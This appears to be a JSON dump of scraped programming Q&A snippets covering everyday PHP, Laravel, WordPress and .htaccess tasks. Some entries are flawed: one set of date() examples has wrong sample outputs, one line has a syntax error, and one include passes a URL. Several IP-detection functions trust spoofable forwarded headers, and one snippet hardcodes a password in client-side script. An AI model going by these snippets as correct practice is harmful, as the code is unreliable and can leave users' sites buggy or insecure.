    "description": "function get_agent_info() {   $u_agent = $_SERVER['HTTP_USER_AGENT'];   $temp = strtolower($_SERVER['HTTP_USER_AGENT']);    $bname    = 'Unknown';   $platform = 'Unknown';   $version  = \"\";    // Get the platform   if (preg_match('/linux/i', $temp)) {     $platform = 'linux';   }   elseif (preg_match('/macintosh|mac os x/i', $temp)) {     $platform = 'mac';   }   elseif (preg_match('/windows|win32/i', $temp)) {     $platform = 'windows';   }    // Get the name of the useragent   if(preg_match('/msie/i',$temp) && !preg_match('/opera/i',$temp)) {     $bname = 'Internet Explorer';     $ub = \"msie\";   }   elseif(preg_match('/firefox/i',$temp)) {     $bname = 'Mozilla Firefox';     $ub = \"firefox\";   }   elseif(preg_match('/chrome/i',$temp)) {     $bname = 'Google Chrome';     $ub = \"chrome\";   }   elseif(preg_match('/safari/i',$temp)) {     $bname = 'Apple Safari';     $ub = \"safari\";   }   elseif(preg_match('/opera/i',$temp)) {     $bname = 'Opera';     $ub = \"opera\";   }   elseif(preg_match('/netscape/i',$temp)) {     $bname = 'Netscape';     $ub = \"netscape\";   }    $known = array('version', $ub, 'other');   $pattern = '#(?<browser>' . join('|', $known) .')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';   preg_match_all($pattern, $temp, $matches);    $i = count($matches['browser']);   if ($i != 1) {     if (strripos($temp,\"version\") < strripos($temp,$ub)) {       $version = $matches['version'][0];     }     else {       $version = $matches['version'][1];     }   }   else {     $version = $matches['version'][0];   }    if ($version == null || $version == \"\") {     $version = \"?\";   }    return array(     'userAgent' \t=> $u_agent,     'browser'      \t=> $bname,     'version'   \t=> $version,     'platform' \t\t=> $platform,   ); }\n",
    "reg_date": "2021-10-12T10:14:48.000Z"
  },
  {
    "id": 1621,
    "keyword": null,
    "link": null,
    "title": " how to get category from post id",
    "description": "get_the_category($post->ID)\n$post   = get_post( 123 ); // Where 123 is the ID $output =  apply_filters( 'the_content', $post->post_content );\n<section class=\"films-tabs pd-40\" id=\"portfolio\">    <?php $film_genres = get_terms('portfolio_cat'); // get all the genres ?>  <div class=\"container\"> <div class=\"row\">   <!-- Nav tabs -->   <ul class=\"nav nav-tabs nav-justified\">     <?php foreach($film_genres as $film_genre) { ?>       <li>         <a href=\"#<?php echo $film_genre->slug ?>\" data-toggle=\"tab\"><?php echo $film_genre->name ?></a>       </li>     <?php } ?>   </ul> </div> </div>    <!-- Tab panes -->   <div class=\"tab-content\">      <?php foreach($film_genres as $film_genre) { ?>        <div class=\"tab-pane\" id=\"<?php echo $film_genre->slug ?>\">         <?php \t         $args = array(           'post_type' => 'portfolio',           'showposts' => -1,           'orderby' => 'title',           'order' => 'ASC',           'tax_query' => array(             array(               'taxonomy' => 'portfolio_cat',               'field' => 'slug',               'terms' => $film_genre->slug             )           )         );         $films = new WP_Query( $args );\t\t         ?>          <?php if ( $films->have_posts() ) : // make sure we have films to show before doing anything?>         <div class=\"table\">             <div class=\"container\">                 <div class=\"row\">                   <?php while ( $films->have_posts() ) : $films->the_post(); ?>\t                                        <div class=\"table-cont\"><a data-fancybox=\"gallery\" href=\"<?php echo get_the_post_thumbnail_url();?>\".><?php the_post_thumbnail() ?></a></div>                                      <?php endwhile; ?>                   <?php wp_reset_query() ?>                  </div>             </div>         </div>         <?php endif; ?>        </div>     <? }  ?>    </div><!-- tab-content -->  </section><!-- film-tabs -->\n",
    "reg_date": "2021-10-12T10:14:48.000Z"
  },
  {
    "id": 1622,
    "keyword": null,
    "link": null,
    "title": " how to get data from a table in laravel",
    "description": "use Illuminate\\Support\\Facades\\DB;  class UserController extends Controller {     public function index()     {         $users = DB::table('users')->select('id','name','email')->get();          return view('some-view')->with('users', $users);     } } \n$users = DB::table('users')->get(); \n",
    "reg_date": "2021-10-12T10:14:48.000Z"
  },
  {
    "id": 1623,
    "keyword": null,
    "link": null,
    "title": " how to get data from html form in php",
    "description": "// Page containing a form: <form action=\"myaction.php\" method=\"post\">  <p>Your name : <input type=\"text\" name=\"name\" /></p>  <input type=\"submit\" value=\"Submit\"> </form>  // myaction.php Hello <?php echo htmlspecialchars($_POST['name']); ?>\n",
    "reg_date": "2021-10-12T10:14:48.000Z"
  },
  {
    "id": 1624,
    "keyword": null,
    "link": null,
    "title": " how to get data from json array in php",
    "description": "<?php   // JSON string   $someJSON = '[{\"name\":\"Jonathan Suh\",\"gender\":\"male\"},{\"name\":\"William Philbin\",\"gender\":\"male\"},{\"name\":\"Allison McKinnery\",\"gender\":\"female\"}]';    // Convert JSON string to Array   $someArray = json_decode($someJSON, true);   print_r($someArray);        // Dump all data of the Array   echo $someArray[0][\"name\"]; // Access Array data    // Convert JSON string to Object   $someObject = json_decode($someJSON);   print_r($someObject);      // Dump all data of the Object   echo $someObject[0]->name; // Access Object data ?> \n$personJSON = '{\"name\":\"Johny Carson\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // Johny Carson\nheader('Content-type: application/json'); echo json_encode($array);\nheader('Content-Type: application/json');   $colors = array(\"red\",\"blue\",\"green\"); echo json_encode($colors);\n$data = json_decode(file_get_contents('php://input'), true); print_r($data); echo $data; \n $data = json_decode($json);\n",
    "reg_date": "2021-10-12T10:14:48.000Z"
  },
  {
    "id": 1625,
    "keyword": null,
    "link": null,
    "title": " how to get date with php",
    "description": "<?php  // Use date    echo date(\"F j, Y, g:i a\");                   // March 10, 2001, 5:16 pm echo date(\"m.d.y\");                           // 03.10.01 echo date(\"j, n, Y\");                         // 10, 3, 2001 echo date(\"Ymd\");                             // 20010310 echo date('h-i-s, j-m-y, it is w Day');       // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 echo date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');     // It is the 10th day. echo date(\"D M j G:i:s T Y\");                 // Sat Mar 10 17:16:18 MST 2001 echo date('H:m:s \\m \\i\\s\\ \\t\\h\\e\\ \\m\\o\\n\\t\\h'); // 17:03:18 m is the month echo date(\"H:i:s\");                           // 17:16:18 echo date(\"Y-m-d H:i:s\");                     // 2001-03-10 17:16:18 Mysql format  ?>\ndate(\"Y-m-d h:i:sa\")\n// 1. create a date instance $date = new DateTime;  // 2. set the date using the setDate(year, month, date) method on the //    $date instance $date->setDate(1999,02,19);\n<?php  // Use date    echo date(\"F j, Y, g:i a\");                   // September 23, 2021, 3:56 pm echo date(\"m.d.y\");                           // 05.20.33 echo date(\"j, n, Y\");                         // 10, 3, 2001 echo date(\"Ymd\");                             // 20210616 echo date('h-i-s, j-m-y, it is w Day');       // 06-17-19, 10-03-01, 1631 1618 6 Satpm01 echo date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');     // It is the 10th day. echo date(\"D M j G:i:s T Y\");                 // Thur Oct 14 17:16:18 MST 1999 echo date('H:m:s \\m \\i\\s\\ \\t\\h\\e\\ \\m\\o\\n\\t\\h'); // 06:11:04 m is the minute echo date(\"H:i:s\");                           // 09:19:30 echo date(\"Y-m-d H:i:s\");                     // 2012-09-14 04:03:02 Mysql format  ?>\n",
    "reg_date": "2021-10-12T10:14:49.000Z"
  },
  {
    "id": 1626,
    "keyword": null,
    "link": null,
    "title": " how to get input value in php variable",
    "description": "$info = array('Doina', 'brown', 'long');  // Listing all the variables list($she, $color, $hear) = $info; echo \"$she has $color eyes color and $hear black hair.\\n\";\n",
    "reg_date": "2021-10-12T10:14:49.000Z"
  },
  {
    "id": 1627,
    "keyword": null,
    "link": null,
    "title": " how to get ip address of client using php",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$clientIPAddress=$_SERVER['REMOTE_ADDR']; \n",
    "reg_date": "2021-10-12T10:14:49.000Z"
  },
  {
    "id": 1628,
    "keyword": null,
    "link": null,
    "title": " how to get ip address of pc in php",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$clientIPAddress=$_SERVER['REMOTE_ADDR']; \nfunction get_client_ip() {   $ipaddress = '';   if (getenv('HTTP_CLIENT_IP'))     $ipaddress = getenv('HTTP_CLIENT_IP');    else if(getenv('HTTP_X_FORWARDED_FOR'))     $ipaddress = getenv('HTTP_X_FORWARDED_FOR');    else if(getenv('HTTP_X_FORWARDED'))     $ipaddress = getenv('HTTP_X_FORWARDED');    else if(getenv('HTTP_FORWARDED_FOR'))     $ipaddress = getenv('HTTP_FORWARDED_FOR');    else if(getenv('HTTP_FORWARDED'))     $ipaddress = getenv('HTTP_FORWARDED');    else if(getenv('REMOTE_ADDR'))     $ipaddress = getenv('REMOTE_ADDR');    else     $ipaddress = 'UNKNOWN';    return $ipaddress; }\n",
    "reg_date": "2021-10-12T10:14:49.000Z"
  },
  {
    "id": 1629,
    "keyword": null,
    "link": null,
    "title": " how to get just the first row from a table in laravel",
    "description": "$user = User::whereEmail($email)->first(); \n $user = DB::table('users_tb')->paginate(1)\n",
    "reg_date": "2021-10-12T10:14:49.000Z"
  },
  {
    "id": 1630,
    "keyword": null,
    "link": null,
    "title": " how to get last array element in php",
    "description": "<?php  $source_array = ['key1' => 'value1', 'key2' => 'value2', 'key3' => 'value3'];  $result = end($source_array);  echo \"Last element: \".$result;  ?>\necho end(['Gon', 'Killua', 'Hisoka']) // print Hisoka\n",
    "reg_date": "2021-10-12T10:14:49.000Z"
  },
  {
    "id": 1631,
    "keyword": null,
    "link": null,
    "title": " how to get last id in database",
    "description": "// Insert query  $query = \"insert into users(username,fname,lname) values('sonarika','Sonarika','Bhadoria')\";   mysqli_query($con,$query);   // Get last insert id  $lastid = mysqli_insert_id($con); \n  $db = db_connect();   $query = $db->query(\"SELECT * FROM users ORDER BY id DESC LIMIT 1\");   $result = $query->getRow();\n",
    "reg_date": "2021-10-12T10:14:49.000Z"
  },
  {
    "id": 1632,
    "keyword": null,
    "link": null,
    "title": " how to get last id in database codeigniter 4",
    "description": "function add_post($post_data){    $this->db->insert('posts', $post_data);    $insert_id = $this->db->insert_id();     return  $insert_id; }\n   $this->db->insert('posts', $post_data);    $insert_id = $this->db->insert_id();    return  $insert_id;\n  $db = db_connect();   $query = $db->query(\"SELECT * FROM users ORDER BY id DESC LIMIT 1\");   $result = $query->getRow();\n",
    "reg_date": "2021-10-12T10:14:49.000Z"
  },
  {
    "id": 1633,
    "keyword": null,
    "link": null,
    "title": " how to get last inserted id in laravel",
    "description": "// how to get last inserted id in laravel  //METHOD-1 $data->save(); $lastId = $data->id;  //METHOD-2 $data = Booking::latest('id')->first(); $id = data->id;\n$last3 = DB::table('items')->latest('id')->first();\n$id = DB::table('users')->insertGetId([     'email' => 'john@example.com',     'votes' => 0 ]); \nDB::getPdo()->lastInsertId(); \n$id = DB::table('users')    ->insertGetId(  \t  ['name' => 'Akash Savani', 'email'=>'akash@gmail.com']  );\nDB::table('myTable')->orderBy('id','desc')->first();\n",
    "reg_date": "2021-10-12T10:14:49.000Z"
  },
  {
    "id": 1634,
    "keyword": null,
    "link": null,
    "title": " how to get length of object in php",
    "description": "$total = count((array)$obj); \n",
    "reg_date": "2021-10-12T10:14:49.000Z"
  },
  {
    "id": 1635,
    "keyword": null,
    "link": null,
    "title": " how to get local current time in laravel",
    "description": "$dt = new DateTime($posts->updated_at); $tz = new DateTimeZone('Asia/Kolkata'); // or whatever zone you're after  $dt->setTimezone($tz); echo $dt->format('Y-m-d H:i:s'); \n",
    "reg_date": "2021-10-12T10:14:50.000Z"
  },
  {
    "id": 1636,
    "keyword": null,
    "link": null,
    "title": " how to get n days from today in php",
    "description": "//Simple method how to get the date of tomorrow, yesterday, etc. is to use:  $tomorrow = date( \"Ymd\", strtotime( \"+1 days\" ) );  $dayaftertomorrow = date( \"Ymd\", strtotime( \"+2 days\" ) );  $yesterday = date( \"Ymd\", strtotime( \"-1 days\" ) );\n",
    "reg_date": "2021-10-12T10:14:50.000Z"
  },
  {
    "id": 1637,
    "keyword": null,
    "link": null,
    "title": " how to get only decimal value in php",
    "description": "$price = 1234.44;  $whole = intval($price); // 1234 $decimal1 = $price - $whole; // 0.44000000000005 uh oh! that's why it needs... (see next line) $decimal2 = round($decimal1, 2); // 0.44 this will round off the excess numbers $decimal = substr($decimal2, 2); // 44 this removed the first 2 characters  if ($decimal == 1) { $decimal = 10; } // Michel's warning is correct... if ($decimal == 2) { $decimal = 20; } // if the price is 1234.10... the decimal will be 1... if ($decimal == 3) { $decimal = 30; } // so make sure to add these rules too if ($decimal == 4) { $decimal = 40; } if ($decimal == 5) { $decimal = 50; } if ($decimal == 6) { $decimal = 60; } if ($decimal == 7) { $decimal = 70; } if ($decimal == 8) { $decimal = 80; } if ($decimal == 9) { $decimal = 90; }  echo 'The dollar amount is ' . $whole . ' and the decimal amount is ' . $decimal;\n",
    "reg_date": "2021-10-12T10:14:50.000Z"
  },
  {
    "id": 1638,
    "keyword": null,
    "link": null,
    "title": " how to get page name in php",
    "description": "echo basename($_SERVER['PHP_SELF']); /* Returns The Current PHP File Name */ \n",
    "reg_date": "2021-10-12T10:14:50.000Z"
  },
  {
    "id": 1639,
    "keyword": null,
    "link": null,
    "title": " how to get php code from website",
    "description": "You can&rsquo;t.  PHP is a server side language. That means, whenever you request  content from any website built with php, the server will send  the rendered content i.e. HTML, CSS and JS,  that means all the PHP code is firstly rendered to HTML  and then it is sent to your browser, that is why you see only  the HTML, CSS and JS whenever you view the source of any webpage.  That&rsquo;s why you cannot see the PHP code for any website.\n",
    "reg_date": "2021-10-12T10:14:50.000Z"
  },
  {
    "id": 1640,
    "keyword": null,
    "link": null,
    "title": " how to get php version in xampp",
    "description": "Open command prompt Locate directory using cd C:/Xampp/php Type command php -v You will get your php version details\n",
    "reg_date": "2021-10-12T10:14:50.000Z"
  },
  {
    "id": 1641,
    "keyword": null,
    "link": null,
    "title": " how to get plugin directory path in wordpress",
    "description": "//current path: /home/user/var/www/wordpress/wp-content/plugins/my-plugin/ $dir = plugin_dir_path( __DIR__ ); //$dir is set to /home/user/var/www/wordpress/wp-content/plugins/ \nif ( is_admin() ) {     include_once( plugin_dir_path( __FILE__ ) . 'includes/admin-functions.php' ); } else {     include_once( plugin_dir_path( __FILE__ ) . 'includes/front-end-functions.php' ); } \ndefine( 'MY_PLUGIN_PATH', plugin_dir_path( __FILE__ ) ); include( MY_PLUGIN_PATH . 'includes/admin-page.php'); include( MY_PLUGIN_PATH . 'includes/classes.php'); // etc. \nfunction enqueue_scripts() {     wp_enqueue_script( 'custom-js', plugin_dir_url( __FILE__ ) . 'js/custom.js', array( 'jquery' ), '', true );     wp_enqueue_style( 'style-css', plugin_dir_url( __FILE__ ) . 'css/style.css' ); } add_action( 'wp_enqueue_scripts', 'enqueue_scripts');   function admin_enqueue_scripts() {     wp_enqueue_script( 'custom-js', plugin_dir_url( __FILE__ ) . 'js/custom.js', array( 'jquery' ), '', true );     wp_enqueue_style( 'style-css', plugin_dir_url( __FILE__ ) . 'css/style.css' ); } add_action( 'admin_enqueue_scripts', 'admin_enqueue_scripts'); \nforeach ( glob( plugin_dir_path( __FILE__ ) . \"subfolder/*.php\" ) as $file ) {     include_once $file; } \n$dir = plugin_dir_path( __FILE__ ); // Example: /home/user/var/www/wordpress/wp-content/plugins/my-plugin/ \n/**  * Include CSS file for MyPlugin.  */ function myplugin_scripts() {     wp_register_style( 'foo-styles',  plugin_dir_url( __FILE__ ) . 'assets/foo-styles.css' );     wp_enqueue_style( 'foo-styles' ); } add_action( 'wp_enqueue_scripts', 'myplugin_scripts' );  Answer http://example.com/wp-content/plugins/my-plugin/assets/foo-styles.css \nfunction plugin_dir_path( $file ) {     return trailingslashit( dirname( $file ) ); } \n",
    "reg_date": "2021-10-12T10:14:50.000Z"
  },
  {
    "id": 1642,
    "keyword": null,
    "link": null,
    "title": " how to get previous page name in php",
    "description": "basename($_SERVER['HTTP_REFERER']);\n//This should be on the previous page session_start(); $_SESSION[\"url\"] = \"the_url_of_page_we_want_to_get_back.php\";  //This should be on the current executing page session_start(); $previous_page_url = $_SESSION[\"url\"];\n",
    "reg_date": "2021-10-12T10:14:50.000Z"
  },
  {
    "id": 1643,
    "keyword": null,
    "link": null,
    "title": " how to get template path in wordpress",
    "description": "<img src=\"<?php echo get_template_directory_uri(); ?>/images/logo.png\" width=\"\" height=\"\" alt=\"\" /> \n// Get template directory example: <img src=\"<?php echo get_template_directory_uri(); ?>/images/logo.png\" />  // If you use child theme you will have to use another function: <img src=\"<?php echo get_stylesheet_directory_uri(); ?>/images/logo.png\" />   \ninclude( get_template_directory_uri() . '/includes/my_file.php' );\n/**  * Enqueue scripts and styles.  */ function wpdocs_theme_slug_scripts() {     // Custom scripts require a unique slug (Theme Name).     wp_enqueue_script( 'theme-slug-custom-script', get_template_directory_uri() . '/js/custom-script.js', array(), '1.0.0', true );       /*      * To avoid double loading Genericons will not need a slug. Same applies      * to all other non-custom styles or scripts.      */     wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '1.0.0' ); } add_action( 'wp_enqueue_scripts', 'wpdocs_theme_slug_scripts' ); \nfunction get_template_directory_uri() {     $template         = str_replace( '/', '/', rawurlencode( get_template() ) );     $theme_root_uri   = get_theme_root_uri( $template );     $template_dir_uri = \"$theme_root_uri/$template\";       /**      * Filters the current theme directory URI.      *      * @since 1.5.0      *      * @param string $template_dir_uri The URI of the current theme directory.      * @param string $template         Directory name of the current theme.      * @param string $theme_root_uri   The themes root URI.      */     return apply_filters( 'template_directory_uri', $template_dir_uri, $template, $theme_root_uri ); } \n",
    "reg_date": "2021-10-12T10:14:50.000Z"
  },
  {
    "id": 1644,
    "keyword": null,
    "link": null,
    "title": " how to get the auth id in lravael",
    "description": "$userId = Auth::id();\n",
    "reg_date": "2021-10-12T10:14:50.000Z"
  },
  {
    "id": 1645,
    "keyword": null,
    "link": null,
    "title": " how to get the current year in php",
    "description": "// get current year using php <?php echo date(\"Y\"); ?>\n$currentYear=date(\"Y\");//2019\n$year = date(\"y\",strtotime($mydate));\nGet the current year using PHP:    <?php  \techo date(\"Y\");  ?>\n",
    "reg_date": "2021-10-12T10:14:50.000Z"
  },
  {
    "id": 1646,
    "keyword": null,
    "link": null,
    "title": " how to get the index in foreach loop in laravel",
    "description": "@foreach ($items as  $item) {{ $loop->index }} @endforeach\n@foreach ($teams as $key => $team) {{ str_ordinal($key + 1) }} @endforeach \n",
    "reg_date": "2021-10-12T10:14:51.000Z"
  },
  {
    "id": 1647,
    "keyword": null,
    "link": null,
    "title": " how to get the link of the current page in php",
    "description": "<?php       if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')             $url = \"https://\";        else            $url = \"http://\";        // Append the host(domain name, ip) to the URL.        $url.= $_SERVER['HTTP_HOST'];             // Append the requested resource location to the URL        $url.= $_SERVER['REQUEST_URI'];                echo $url;     ?> \nactual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\";\n",
    "reg_date": "2021-10-12T10:14:51.000Z"
  },
  {
    "id": 1648,
    "keyword": null,
    "link": null,
    "title": " how to get the list of available timezones in php",
    "description": "echo date_default_timezone_get(); //UTC  //Read more at https://www.php.net/manual/en/function.date-default-timezone-get.php\n//To Get the list of timezones available in php //use the static function listIdentifiers() on DateTimeZone class $list = DateTimeZone::listIdentifiers(); print_r($list)\n",
    "reg_date": "2021-10-12T10:14:51.000Z"
  },
  {
    "id": 1649,
    "keyword": null,
    "link": null,
    "title": " how to get users IP address in php",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$ip = $_SERVER['REMOTE_ADDR'];\nfunction getIp() {     $ip = $_SERVER['REMOTE_ADDR'];       if (!empty($_SERVER['HTTP_CLIENT_IP'])) {         $ip = $_SERVER['HTTP_CLIENT_IP'];     } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {         $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];     }       return $ip; }\n#to best handle proxies use this: if (!empty($_SERVER['HTTP_CLIENT_IP'])) {     $ip = $_SERVER['HTTP_CLIENT_IP']; } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {     $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } else {     $ip = $_SERVER['REMOTE_ADDR']; }\n<?php  // Most effective way to get users IP function get_ip_address(){     foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key){         if (array_key_exists($key, $_SERVER) === true){             foreach (explode(',', $_SERVER[$key]) as $ip){                 $ip = trim($ip); // just to be safe                  if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){                     return $ip;                 }             }         }     } }  ?>\n",
    "reg_date": "2021-10-12T10:14:51.000Z"
  },
  {
    "id": 1650,
    "keyword": null,
    "link": null,
    "title": " how to get variable from url in laravel",
    "description": "request('variable')\n",
    "reg_date": "2021-10-12T10:14:51.000Z"
  },
  {
    "id": 1651,
    "keyword": null,
    "link": null,
    "title": " how to get video duration in php",
    "description": "include_once('pathto/getid3.php'); $getID3 = new getID3; $file = $getID3->analyze($filename); echo(\"Duration: \".$file['playtime_string']. \" / Dimensions: \".$file['video']['resolution_x'].\" wide by \".$file['video']['resolution_y'].\" tall\". \" / Filesize: \".$file['filesize'].\" bytes<br />\");\n",
    "reg_date": "2021-10-12T10:14:51.000Z"
  },
  {
    "id": 1652,
    "keyword": null,
    "link": null,
    "title": " how to get woocommerce product price",
    "description": "$_product->get_regular_price(); $_product->get_sale_price(); $_product->get_price();\nfunction so_30165014_price_shortcode_callback( $atts ) {     $atts = shortcode_atts( array(         'id' => null,     ), $atts, 'bartag' );      $html = '';      if( intval( $atts['id'] ) > 0 && function_exists( 'wc_get_product' ) ){          $_product = wc_get_product( $atts['id'] );          $html = \"price = \" . $_product->get_price();     }     return $html; } add_shortcode( 'woocommerce_price', 'so_30165014_price_shortcode_callback' );\n",
    "reg_date": "2021-10-12T10:14:51.000Z"
  },
  {
    "id": 1653,
    "keyword": null,
    "link": null,
    "title": " how to go to another folder in php",
    "description": "just add the source of another file   for example: you are in \"localhost/library/admin/admin_login\" and you have to go to student login   <a href=\"localhost/library/student/student_login.php\">For Student Login Click Here<a/>\n",
    "reg_date": "2021-10-12T10:14:51.000Z"
  },
  {
    "id": 1654,
    "keyword": null,
    "link": null,
    "title": " how to go to index page on clicking a button in html",
    "description": "<input type=button onClick=\"parent.location='index.html'\" value='click here'>\n",
    "reg_date": "2021-10-12T10:14:51.000Z"
  },
  {
    "id": 1655,
    "keyword": null,
    "link": null,
    "title": " how to hide .php extension using .htaccess",
    "description": "//put this piece of code in the root file .htaccess RewriteEngine on #remove extension html RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}\\.html -f RewriteRule ^(.*)$ $1.html [NC,L]  #remove extension php RewriteCond %{REQUEST_FILENAME} !-d  RewriteCond %{REQUEST_FILENAME}\\.php -f  RewriteRule ^(.*)$ $1.php\nRewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^([^\\.]+)$ $1.php [NC,L] \nRewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^([^/]+)/$ $1.php RewriteRule ^([^/]+)/([^/]+)/$ /$1/$2.php RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5}|/)$ RewriteRule (.*)$ /$1/ [R=301,L]  #This works with xxx/index.php too (visiting mysite.com/xxx/)\n# Apache Rewrite Rules  <IfModule mod_rewrite.c>   Options +FollowSymLinks   RewriteEngine On   RewriteBase /  # Add trailing slash to url   RewriteCond %{REQUEST_FILENAME} !-f   RewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5}|/|#(.*))$   RewriteRule ^(.*)$ $1/ [R=301,L]  # Remove .php-extension from url   RewriteCond %{REQUEST_FILENAME} !-d   RewriteCond %{REQUEST_FILENAME}\\.php -f   RewriteRule ^([^\\.]+)/$ $1.php   # End of Apache Rewrite Rules  </IfModule> \n",
    "reg_date": "2021-10-12T10:14:51.000Z"
  },
  {
    "id": 1656,
    "keyword": null,
    "link": null,
    "title": " how to hide get parameters in url php",
    "description": "function strip_param_from_url( $url, $param ) {     $base_url = strtok($url, '?');              // Get the base url     $parsed_url = parse_url($url);              // Parse it      $query = $parsed_url['query'];              // Get the query string     parse_str( $query, $parameters );           // Convert Parameters into array     unset( $parameters[$param] );               // Delete the one you want     $new_query = http_build_query($parameters); // Rebuilt query string     return $base_url.'?'.$new_query;            // Finally url is ready } // Usage echo strip_param_from_url( 'http://url.com/search/?location=london&page_number=1',  \t'location' )\n<a href=\"#\" onclick=\"postLogin()\">Log me into this website</a>  <script type=\"text/javascript\"> function postLogin() {     var form = document.createElement(\"form\");     form.setAttribute(\"method\", \"post\");     form.setAttribute(\"action\", \"http://search.mywebsite.com/login.aspx\");      var params = {checktype: 'uid', user: 'adam', password: 'pass1234', profile: 'dart', defaultdb: 'kts'};     for(var key in params) {         if(params.hasOwnProperty(key)) {             var hiddenField = document.createElement(\"input\");             hiddenField.setAttribute(\"type\", \"hidden\");             hiddenField.setAttribute(\"name\", key);             hiddenField.setAttribute(\"value\", params[key]);              form.appendChild(hiddenField);          }     }      document.body.appendChild(form);     form.submit(); } </script>\n",
    "reg_date": "2021-10-12T10:14:52.000Z"
  },
  {
    "id": 1657,
    "keyword": null,
    "link": null,
    "title": " how to host laravel project on local server",
    "description": "Run all of those commands: composer install or php composer.phar install mv .env.example .env php artisan key:generate php artisan migrate php artisan db:seed to run seeders, if any. php artisan serve\nphp artisan serve --host=195.154.12.125 --port=8001   project host in local machine\n// command to host laravel project on local machine  //php artitan serve --host=your ip address --port=select port php artisan serve --host=195.154.12.125 --port=8001\n 1. composer update --no-scripts  or composer install  2. php artisan key:generate   3. rename example.env to .env  4. Change database credentials, set debug mode! Change app url  4. php artisan migrate(make sure u have the database running in the server)  5. php artisan config:clear  6. you are good to go! \n",
    "reg_date": "2021-10-12T10:14:52.000Z"
  },
  {
    "id": 1658,
    "keyword": null,
    "link": null,
    "title": " how to import .sql file in mysql database using php",
    "description": "<?php $conn =new mysqli('localhost', 'root', '' , 'blog_samples');  $query = ''; $sqlScript = file('database-script.sql'); foreach ($sqlScript as $line)\t{ \t \t$startWith = substr(trim($line), 0 ,2); \t$endWith = substr(trim($line), -1 ,1); \t \tif (empty($line) || $startWith == '--' || $startWith == '/*' || $startWith == '//') { \t\tcontinue; \t} \t\t \t$query = $query . $line; \tif ($endWith == ';') { \t\tmysqli_query($conn,$query) or die('<div class=\"error-response sql-import-response\">Problem in executing the SQL query <b>' . $query. '</b></div>'); \t\t$query= '';\t\t \t} } echo '<div class=\"success-response sql-import-response\">SQL file imported successfully</div>'; ?>\n",
    "reg_date": "2021-10-12T10:14:52.000Z"
  },
  {
    "id": 1659,
    "keyword": null,
    "link": null,
    "title": " how to import database in phpmyadmin",
    "description": "open phpmyadmin from the menu navigate to the import tab click choose file, and upload your sql file **HINT** the database should be created before importing the SQL file\n",
    "reg_date": "2021-10-12T10:14:52.000Z"
  },
  {
    "id": 1660,
    "keyword": null,
    "link": null,
    "title": " how to index column in laravel",
    "description": "$table->index(['account_id', 'created_at']);\n",
    "reg_date": "2021-10-12T10:14:52.000Z"
  },
  {
    "id": 1661,
    "keyword": null,
    "link": null,
    "title": " how to insert hindi text in mysql database",
    "description": "<?php /*   first of all open database structure and change     table Collation  to (utf8_general_cithen) save the changes    You need to just add few queries when you establish database connection so    that your database support for utf8 Unicode characters.      Add the below lines to your database Config FIle */  mysqli_query($con,\"SET character_set_results = 'utf8', character_set_client = 'utf8', character_set_connection = 'utf8', character_set_database = 'utf8', character_set_server = 'utf8'\"); mysqli_set_charset($con,'utf8'); ?>\n",
    "reg_date": "2021-10-12T10:14:52.000Z"
  },
  {
    "id": 1662,
    "keyword": null,
    "link": null,
    "title": " how to insert multiple data at a time with create method in laravel",
    "description": "$data = [     ['user_id'=>'Coder 1', 'subject_id'=> 4096],     ['user_id'=>'Coder 2', 'subject_id'=> 2048],     //... ];  Model::insert($data); // Eloquent approach DB::table('table')->insert($data); // Query Builder approach\n",
    "reg_date": "2021-10-12T10:14:52.000Z"
  },
  {
    "id": 1663,
    "keyword": null,
    "link": null,
    "title": " how to install all php extensions ubuntu",
    "description": "sudo apt install openssl php-common php-curl php-json php-mbstring php-mysql php-xml php-zip\n",
    "reg_date": "2021-10-12T10:14:52.000Z"
  },
  {
    "id": 1664,
    "keyword": null,
    "link": null,
    "title": " how to install bootstrap in laravel 8",
